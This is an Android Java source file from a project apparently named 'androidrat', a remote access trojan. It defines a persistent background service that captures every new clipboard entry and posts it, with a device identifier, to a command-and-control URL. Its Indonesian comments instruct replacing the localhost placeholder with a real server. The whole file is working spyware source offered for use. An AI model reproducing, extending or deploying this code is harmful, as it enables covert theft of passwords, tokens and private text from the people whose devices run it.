package com.example.androidrat;

import android.app.Service;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ClipboardListenerService extends Service {

    private static final String TAG = "ClipboardListener";
    // URL C2 perlu diganti dengan server asli.
    // Untuk tujuan demonstrasi, ini akan mengarah ke endpoint yang tidak ada.
    private static final String C2_URL = "http://127.0.0.1:8080/clipboard";

    private ClipboardManager clipboardManager;
    private OkHttpClient httpClient;

    private final ClipboardManager.OnPrimaryClipChangedListener clipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
        @Override
        public void onPrimaryClipChanged() {
            Log.d(TAG, "Clipboard content changed.");
            if (clipboardManager.hasPrimaryClip() && clipboardManager.getPrimaryClip().getItemCount() > 0) {
                CharSequence text = clipboardManager.getPrimaryClip().getItemAt(0).getText();
                if (text != null) {
                    String clipboardText = text.toString();
                    Log.i(TAG, "New clipboard text: " + clipboardText);
                    sendClipboardData(clipboardText);
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        httpClient = new OkHttpClient();
        Log.d(TAG, "ClipboardListenerService created.");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ClipboardListenerService started.");
        clipboardManager.addPrimaryClipChangedListener(clipChangedListener);
        // Layanan ini perlu terus berjalan
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (clipboardManager != null) {
            clipboardManager.removePrimaryClipChangedListener(clipChangedListener);
        }
        Log.d(TAG, "ClipboardListenerService destroyed.");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void sendClipboardData(String data) {
        // Di sini Anda akan menambahkan ID perangkat atau informasi identifikasi lainnya
        RequestBody formBody = new FormBody.Builder()
                .add("clipboard_data", data)
                .add("deviceId", "some_unique_id") // Contoh ID perangkat
                .build();

        Request request = new Request.Builder()
                .url(C2_URL)
                .post(formBody)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "Failed to send clipboard data to C2", e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.i(TAG, "Successfully sent clipboard data to C2.");
                } else {
                    Log.e(TAG, "Failed to send clipboard data to C2. Response code: " + response.code());
                }
                // Pastikan untuk menutup body respons untuk melepaskan sumber daya
                response.close();
            }
        });
    }
}
